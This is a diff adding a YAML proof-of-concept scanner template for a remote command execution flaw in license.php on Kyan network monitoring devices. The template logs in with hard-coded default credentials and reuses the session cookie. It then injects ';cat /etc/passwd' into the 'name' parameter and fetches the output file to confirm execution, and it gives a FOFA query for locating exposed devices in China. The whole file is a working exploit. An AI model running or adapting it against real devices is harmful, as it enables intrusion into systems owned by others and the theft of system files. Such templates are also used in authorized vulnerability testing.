@@ -1,0 +1,29 @@
+id: poc-yaml-kyan-network-monitoring-equipment-license-php-rce
+info:
+  name: Kyan 网络监控设备 license.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Kyan
+  fofa: title="platform - Login" && country="CN"
+variables:
+  t1: random_int(1,1000)
+requests:
+- method: POST
+  path: /login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user=admin&passwd=admin1234&x=49&y=24
+  expression: status_code == 302 && contains(headers,"/index.php")
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>[0-9a-z]+)")
+- method: GET
+  path: /license.php?cmd=delete&name=;cat+/etc/passwd>{{.t1}}.txt
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"选择文件") && contains(body,"上传授权")
+- method: GET
+  path: /{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
